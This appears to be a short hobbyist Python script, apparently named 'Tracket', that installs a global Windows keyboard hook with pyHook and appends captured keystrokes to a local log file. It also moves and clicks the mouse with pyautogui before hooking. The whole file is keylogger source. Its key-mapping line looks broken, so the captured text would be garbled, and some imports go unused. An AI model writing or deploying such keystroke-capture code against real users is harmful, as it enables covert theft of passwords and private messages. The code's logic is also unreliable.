import pyHook, pythoncom, sys, logging,urllib,os
import time, pyautogui

file_log = open('C:/Users/Vishnu/PycharmProjects/Tracket/Tracketlog.txt', 'a')

def OnKeyBoardEvent(event):

    try:
        file_log = open('C:/Users/Vishnu/PycharmProjects/Tracket/Tracketlog.txt', 'a')
        key = ' '
        if(event.Ascii!=0):
            if(event.Ascii==32): key = ' '
            else: key = (chr(96+event.Ascii))
        file_log.write(key)
        file_log.close()


    except:
        pass
    return True

def launchLogger():
    time.sleep(5)
    pyautogui.moveTo(pyautogui.position()[0]+10, pyautogui.position()[1]+10, duration=0)
    pyautogui.click()
    hook_manager = pyHook.HookManager()
    hook_manager.KeyDown = OnKeyBoardEvent
    hook_manager.HookKeyboard()
    pythoncom.PumpMessages()
